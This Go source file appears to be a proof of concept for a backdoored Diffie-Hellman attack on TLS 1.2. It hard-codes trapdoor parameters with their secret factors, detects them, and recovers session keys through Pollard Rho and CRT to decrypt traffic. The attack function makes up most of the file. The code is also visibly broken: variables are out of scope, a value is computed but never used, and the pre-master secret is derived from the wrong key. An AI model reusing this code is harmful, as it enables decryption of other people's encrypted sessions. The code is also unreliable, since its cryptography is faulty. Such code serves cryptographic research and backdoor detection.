package main

import(
	"log"
	"github.com/mimoo/GoNTL"
	//"crypto/tls"
	"crypto/hmac"
	"crypto/sha256"
	"hash"
	"math/big"
)

// the backdoor parameters
var dh1024_n = [39]byte{64, 150, 51, 112, 121, 135, 0, 85, 130, 105, 102, 2, 39, 121, 85, 40, 33, 71, 100, 48, 133, 38, 136, 1, 23, 116, 121, 18, 9, 105, 71, 50, 23, 153, 135, 84, 70, 0, 19}
var dh1024_g = [38]byte{82, 71, 99, 49, 129, 98, 97, 53, 71, 98, 130, 116, 70, 53, 37, 17, 24, 101, 117, 89, 49, 36, 68, 120, 89, 22, 37, 54, 68, 41, 9, 70, 48, 152, 67, 87, 130, 89}
var p string = "251153300769938074253856282383556425027"
var q string = "1631010648600788382336119717304312773519"
var p_small string = "244159"
var q_small string = "1478123"

// helper
func equality(a []byte, b []byte) (bool) {
	// bytes
	for index,_ := range a {
		if a[index] != b[index] {
			return false
		}
	}
	//
	return true
}

// backdoored parameters?
func backdoored(modulus []byte, generator []byte) (bool) {
	if len(dh1024_n) == len(modulus) && len(dh1024_g) == len(generator) &&
		equality(dh1024_n[:], modulus) && equality(dh1024_g[:], generator) {
		log.Println("backdoor detected!")
		return true
	} else {
		return false
	}
}


func pHash(result, secret, seed []byte, hash func() hash.Hash) {
	h := hmac.New(hash, secret)
	h.Write(seed)
	a := h.Sum(nil)
	
	j := 0
	for j < len(result) {
		h.Reset()
		h.Write(a)
		h.Write(seed)
		b := h.Sum(nil)
		todo := len(b)
		if j+todo > len(result) {
			todo = len(result) - j
			}
		copy(result[j:j+todo], b)
		j += todo
		
		h.Reset()
		h.Write(a)
		a = h.Sum(nil)
	}
}

// compute the 48 bytes master key from the pre master key
func get_masterSecret(preMasterSecret []byte, clientRandom []byte, serverRandom []byte) ([]byte) {
	// let's say version tls1.2, AES-128-CBC, sha256 to keep things simple

	// seed
	var label = []byte("master secret")
	seed := make([]byte, 0, len(label) + len(clientRandom) + len(serverRandom))
	seed = append(seed, label...)
	seed = append(seed, clientRandom...)
	seed = append(seed, serverRandom...)

	// PRF!
	masterSecret := make([]byte, 48)
	pHash(masterSecret, preMasterSecret, seed, sha256.New)

	return masterSecret
}

func get_keys(masterSecret []byte) ([]byte, []byte, []byte, []byte) {
	// let's say version tls1.2, AES-128-CBC, sha256 to keep things simple

	// seed
	var label = []byte("key expansion")
	seed := make([]byte, 0, len(label) + len(clientRandom) + len(serverRandom))
	seed = append(seed, label...)
	seed = append(seed, clientRandom[:]...)
	seed = append(seed, serverRandom[:]...)

	// PRF!
	keys := make([]byte, 32*2 + 16*2) // HMAC-256 take 256bit keys, AES-128 takes 128bit keys...
	pHash(keys, masterSecret, seed, sha256.New)

	return keys[:32], keys[32:32*2], keys[32*2:32*2+16], keys[32*2+16:32*2+2*16]
}

// the attack
func attack(serverPubkey []byte, clientPubkey []byte, serverRandom []byte, clientRandom []byte) ([]byte, []byte, []byte, []byte){

	// convert to big.Int
	y := new(big.Int)
	y.SetBytes(serverPubkey)

	modulus := new(big.Int)
	modulus.SetBytes(dh1024_n[:])

	generator := new(big.Int)
	generator.SetBytes(dh1024_g[:])

	prime1 := new(big.Int)
	prime1.SetString(p, 10)

	prime2 := new(big.Int)
	prime2.SetString(q, 10)

	order1 := new(big.Int)
	order1.SetString(p_small, 10)

	order2 := new(big.Int)
	order2.SetString(q_small, 10)

	// divide the problem in p and q
	yp := new(big.Int)
	yp.Mod(y, prime1)

	yq := new(big.Int)
	yq.Mod(y, prime2)
	
	// Pollard Rho of each problem
	xp := gontl.Pollard_Rho(yp, generator, prime1, order1, gontl.Big0, gontl.Big0)
	xq := gontl.Pollard_Rho(yq, generator, prime2, order2, gontl.Big0, gontl.Big0)

	// Remove qq=(q-1)/2, use pp=p-1
	pp := new(big.Int)
	pp.Sub(prime1, gontl.Big1)

	qq := new(big.Int)
	qq.Sub(prime2, gontl.Big1)
	qq.DivMod(qq, gontl.Big2, modulus)
	
	// CRT
	x1 := gontl.CRT2(xp, xq, pp, qq)

	// second solution
	plus := new(big.Int)
	plus.Mul(pp, qq)
	x2 := new(big.Int)
	x2.Add(x1, plus)

	// Compute the pre-master secret
	y2 := new(big.Int)
	y2.SetBytes(clientPubkey)

	x1.Exp(y, x1, modulus) // first solution

	x2.Exp(y, x2, modulus) // second solution

	// Compute the master_secret
	masterSecret := get_masterSecret(x1.Bytes(), clientRandom, serverRandom)

	// masterSecret := get_masterSecret(x2, clientRandom, serverRandom)

	// Derive the keys
	return get_keys(masterSecret)
}


